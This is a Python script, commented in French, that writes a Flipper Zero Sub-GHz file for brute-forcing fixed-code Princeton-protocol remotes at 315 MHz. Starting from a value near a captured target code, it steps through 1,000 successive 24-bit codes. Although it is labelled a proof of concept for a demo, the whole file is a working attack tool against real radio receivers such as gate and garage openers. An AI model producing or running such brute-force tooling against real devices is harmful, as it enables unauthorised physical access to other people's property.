import os

def generate_flipper_bruteforce_sub(
    filename, 
    frequency, 
    modulation, 
    base_code_int, 
    num_codes, 
    bit_length
):
    """
    Génère un fichier .sub pour Flipper Zero qui exécute une force brute.
    Nous utilisons le protocole 'Princeton' à titre d'exemple de structure à code.
    
    Arguments:
      - base_code_int: Le code de base d'où la séquence commence (en décimal).
      - num_codes: Le nombre de codes successifs à tenter.
    """
    
    # --- 1. En-tête standard du fichier Sub-GHz ---
    content = f"""Filetype: Flipper SubGhz Key File
Version: 1
Frequency: {frequency}
Preset: FuriHalSubGhzPresetCustom
Protocol: Princeton
Modulation: {modulation}
Bit: {bit_length}

"""
    print(f"-> Démarrage de la génération de {num_codes} codes pour {filename}...")

    # --- 2. Génération des blocs de codes ---
    for i in range(num_codes):
        # Le code actuel est l'index + le code de base
        current_code = base_code_int + i
        
        # Conversion en chaîne hexadécimale avec le bon nombre de chiffres (0-padding)
        # Par exemple, si Bit: 24, on veut 6 caractères hex (24/4 = 6)
        hex_length = bit_length // 4
        data_hex = format(current_code, f'0{hex_length}X')
        
        # Ajout du bloc de tentative au fichier
        content += f"Key_name: Tentative_{i+1}\n"
        content += f"Type: Timed\n"
        content += f"Data: 0x{data_hex}\n"
        content += "\n"

    # --- 3. Écriture du fichier ---
    with open(filename, 'w') as f:
        f.write(content)
    
    print(f"-> Terminé. Le fichier '{filename}' a été créé avec succès.")
    print(f"-> Premier code tenté: 0x{format(base_code_int, f'0{hex_length}X')}")
    print(f"-> Dernier code tenté: 0x{format(current_code, f'0{hex_length}X')}")

# ==============================================================================
#                 PARAMÈTRES D'EXÉCUTION DU PROJET 
# ==============================================================================

# NOM DU FICHIER FINAL POUR LE FLIPPER ZERO
# Nom plus descriptif pour le dépôt GitHub
output_filename = "SubGHz_BruteForce_PoC.sub"

# FRÉQUENCE (Ajustée pour la norme Amérique du Nord - Canada/USA)
frequency_mhz = 315.000 

# MODULATION (ASK est la plus courante pour les télécommandes simples)
modulation_type = "ASK"  

# LONGUEUR DU CODE (24 bits = 6 chiffres hex)
bit_length_code = 24 

# CODE DE DÉPART (Capture initiale du code cible)
# Remplacer cette valeur par une valeur proche du code capturé au début 
# pour déterminer la plage à attaquer.
BASE_CODE_START = 0xAAFB28

# NOMBRE DE CODES À GÉNÉRER (Fenêtre d'attaque plus grande pour une meilleure démo)
NUMBER_OF_CODES = 1000

# ==============================================================================
#                            EXÉCUTION
# ==============================================================================

if __name__ == '__main__':
    generate_flipper_bruteforce_sub(
        filename=output_filename, 
        frequency=frequency_mhz, 
        modulation=modulation_type, 
        base_code_int=BASE_CODE_START, 
        num_codes=NUMBER_OF_CODES,
        bit_length=bit_length_code
    )